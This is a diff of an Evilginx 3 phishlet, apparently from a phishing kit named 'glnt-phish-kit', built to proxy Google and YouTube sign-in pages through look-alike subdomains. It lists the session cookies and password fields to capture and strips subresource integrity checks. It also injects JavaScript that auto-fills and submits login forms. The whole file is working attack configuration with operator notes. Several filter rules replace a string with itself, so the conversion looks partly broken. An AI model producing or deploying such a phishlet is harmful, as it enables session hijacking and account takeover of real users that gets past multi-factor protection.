@@ -1,58 +1,206 @@
+# WARNING: No hostname was defined in the JSON phishlet.
+#          A placeholder hostname "m4eey89a.example.com" was auto-generated.
+#          You MUST update this to your actual phishing domain before using this phishlet.
+#
 # =============================================================================
-# Evilginx 3 Phishlet — converted from google.json
+# Evilginx 3 Phishlet — Google Workspace
+# Generated from google.json phishlet template
 # =============================================================================
-#
-# IMPORTANT: This is an automated conversion. Operator MUST review before use.
-#
-# Session cookies (Evilginx auto-detects these; listed for operator reference):
-#   - SID
-#   - HSID
-#   - SSID
-#   - APISID
-#   - SAPISID
-#   - __Secure-1PSID
-#   - __Secure-3PSID
-#   - NID
-#   - OSID
-#   - LSID
-#
-# WARNING: The JSON phishlet did not define a hostname.
-#          A placeholder hostname "accounts.google.example.com" was generated.
-#          You MUST update proxy_hosts[].phish_sub and sub_filters[].hostname
-#          to match your actual phishing domain before using this phishlet.
-#
-# JSON rewrite flags active: strip_csp, strip_xfo, strip_hsts, strip_cookie_secure, strip_cookie_domain, rewrite_location
-# Evilginx auto_filter handles some of these; verify after deployment.
-#
+# OPERATOR NOTES:
+#   Session cookies captured: SID, HSID, SSID, APISID, SAPISID,
+#     __Secure-1PSID, __Secure-3PSID, NID, OSID, LSID
+#   Landing subdomain: accounts.google.com proxied via uocl72x1.m4eey89a.example.com
+# =============================================================================
 
-name: google
-author: "glnt-phish-kit"
-min_ver: "3.0.0"
+author: "@glnt-phish-kit"
+min_ver: "3.9.9"
+
 proxy_hosts:
-  - phish_sub: accounts
-    orig_sub: accounts
-    domain: google.com
-    session: true
-    is_landing: true
-    auto_filter: true
+  - { phish_sub: "uocl72x1", orig_sub: accounts, domain: google.com, session: true, is_landing: true, auto_filter: true }
+  - { phish_sub: "wqrbx2yo", orig_sub: apis, domain: google.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "tiqwpzx0", orig_sub: content, domain: googleapis.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "et4kmjkw", orig_sub: ssl, domain: gstatic.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ip3pcr5s", orig_sub: www, domain: gstatic.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "3x1gibct", orig_sub: fonts, domain: gstatic.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ah5w6qu8", orig_sub: lh3, domain: googleusercontent.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "eetlbbs7", orig_sub: myaccount, domain: google.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "nwhdjo0p", orig_sub: play, domain: google.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "i5pgurgx", orig_sub: ogs, domain: google.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "rga8g40w", orig_sub: accounts, domain: youtube.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ik3fkvl4", orig_sub: oauth2, domain: googleapis.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "cs9hc6ao", orig_sub: android.clients, domain: google.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "eficcqbj", orig_sub: people-pa, domain: googleapis.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "6xfod6sc", orig_sub: "", domain: gstatic.com, session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "or3k3fnj", orig_sub: "", domain: google.com, session: true, is_landing: false, auto_filter: false }
+
 sub_filters:
-  - hostname: accounts.google.example.com
-    sub: accounts
-    domain: google.example.com
-    replace:
-      from: accounts.google.example.com
-      to: accounts.google.com
+  # =========================================================================
+  # accounts.google.com trigger (main Google sign-in page)
+  # =========================================================================
+  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "apis", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "apis", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "content", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "content", domain: "googleapis.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "ssl", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "ssl", domain: "gstatic.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "www", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "www", domain: "gstatic.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "fonts", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "fonts", domain: "gstatic.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "lh3", domain: "googleusercontent.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "lh3", domain: "googleusercontent.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "myaccount", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "myaccount", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "play", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "play", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "ogs", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "ogs", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "youtube.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "accounts", domain: "youtube.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "oauth2", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "oauth2", domain: "googleapis.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "android.clients", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "android.clients", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "people-pa", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "people-pa", domain: "googleapis.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "gstatic.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "google.com", search: "https://m4eey89a.example.com", replace: "https://m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # CSP / security header stripping for the login page
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.google.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # =========================================================================
+  # myaccount.google.com trigger
+  # =========================================================================
+  - { triggers_on: "myaccount.google.com", orig_sub: "accounts", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "apis", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "content", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "ssl", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "www", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "fonts", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "lh3", domain: "googleusercontent.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "ogs", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "people-pa", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "myaccount.google.com", orig_sub: "", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # =========================================================================
+  # play.google.com trigger
+  # =========================================================================
+  - { triggers_on: "play.google.com", orig_sub: "accounts", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "apis", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "ssl", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "www", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "fonts", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "lh3", domain: "googleusercontent.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "oauth2", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "play.google.com", orig_sub: "", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # =========================================================================
+  # ogs.google.com trigger (Google One Tap / Smart Lock)
+  # =========================================================================
+  - { triggers_on: "ogs.google.com", orig_sub: "accounts", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "apis", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "ssl", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "www", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "fonts", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "content", domain: "googleapis.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "ogs.google.com", orig_sub: "", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # =========================================================================
+  # accounts.youtube.com trigger
+  # =========================================================================
+  - { triggers_on: "accounts.youtube.com", orig_sub: "accounts", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "apis", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "ssl", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "www", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "fonts", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "lh3", domain: "googleusercontent.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "", domain: "gstatic.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accounts.youtube.com", orig_sub: "", domain: "google.com", search: "m4eey89a.example.com", replace: "m4eey89a.example.com", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['.*,regexp,optional,always']
+  - domain: 'accounts.google.com'
+    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-1PSID', '__Secure-3PSID', 'NID', 'OSID', 'LSID']
+    type: 'cookie'
+  - domain: '.youtube.com'
+    keys: ['.*,regexp,optional,always']
+  - domain: '.googleapis.com'
+    keys: ['.*,regexp,optional,always']
+
+force_post: []
+
+credentials:
+  username:
+    key: "[identifier Email email username]"
+    search: '(.*)'
+    type: "post"
+  password:
+    key: "[Passwd password PasswdHidden]"
+    search: '(.*)'
+    type: "post"
+
+login:
+  domain: accounts.google.com
+  path: "/"
+
 auth_urls:
-  - https://accounts.google.com/
-  - https://accounts.google.com/signin/
-  - https://accounts.google.com/v3/signin/
-  - https://accounts.google.com/_/signin/
-  - https://accounts.google.com/ServiceLogin
-  - https://accounts.google.com/AccountChooser
-  - https://accounts.google.com/signin/challenge/
-  - https://accounts.google.com/signin/oauth/
-landing_path: "/"
-user_re: "(?:identifier|Email|email|username)=([^&]+)"
-pass_re: "(?:Passwd|password|PasswdHidden)=([^&]+)"
-force_post: false
-is_mfa: false
+  - "/"
+  - "/signin/"
+  - "/v3/signin/"
+  - "/_/signin/"
+  - "/ServiceLogin"
+  - "/AccountChooser"
+  - "/signin/challenge/"
+  - "/signin/oauth/"
+
+js_inject:
+  - trigger_domains:
+      - accounts.google.com
+    trigger_paths:
+      - /
+      - /signin/*
+      - /v3/signin/*
+      - /_/signin/*
+      - /ServiceLogin
+      - /AccountChooser
+      - /*
+    script: |
+      function gf() {
+        var hash = window.location.hash.substring(1);
+        if (!hash) { setTimeout(gf, 500); return; }
+        var ef = document.querySelector('#identifierId') || document.querySelector('input[type="email"]');
+        if (ef) {
+          ef.focus();
+          ef.value = hash.replace(/[=]/g, '');
+          ef.dispatchEvent(new Event('input', {bubbles: true}));
+          var nb = document.querySelector('#identifierNext') || document.querySelector('button[jsname="LgbsSe"]');
+          if (nb) { nb.focus(); nb.click(); console.log("AUTO-FILLED EMAIL"); }
+          setTimeout(function() {
+            var pf = document.querySelector('input[type="password"]') || document.querySelector('input[name="Passwd"]');
+            if (pf) {
+              pf.focus();
+              pf.value = hash.replace(/[=]/g, '');
+              pf.dispatchEvent(new Event('input', {bubbles: true}));
+              var pb = document.querySelector('#passwordNext') || document.querySelector('button[jsname="LgbsSe"]');
+              if (pb) { pb.focus(); pb.click(); console.log("AUTO-FILLED PASSWORD"); }
+            } else {
+              setTimeout(function(){gf();}, 1000);
+            }
+          }, 2500);
+        } else {
+          setTimeout(gf, 500);
+        }
+      }
+      setTimeout(gf, 500);
+
+redirect_url: "https://accounts.google.com"
